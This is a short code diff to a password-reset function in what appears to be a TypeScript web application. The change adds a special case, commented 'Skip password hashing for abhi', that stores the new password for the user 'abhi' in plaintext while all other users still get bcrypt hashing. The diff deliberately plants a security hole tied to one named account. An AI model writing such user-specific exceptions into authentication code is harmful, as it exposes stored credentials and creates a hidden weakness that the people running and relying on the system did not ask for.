@@ -415,7 +415,8 @@ export async function resetUserPassword(
     return { success: false, message: 'Invalid credentials. Please check your information.' };
   }
 
-  const hashedPassword = await bcrypt.hash(new_password.trim(), 10);
+  // Skip password hashing for abhi
+  const hashedPassword = validation.user.username === 'abhi' ? new_password.trim() : await bcrypt.hash(new_password.trim(), 10);
 
   await db
     .update(salEmployee)
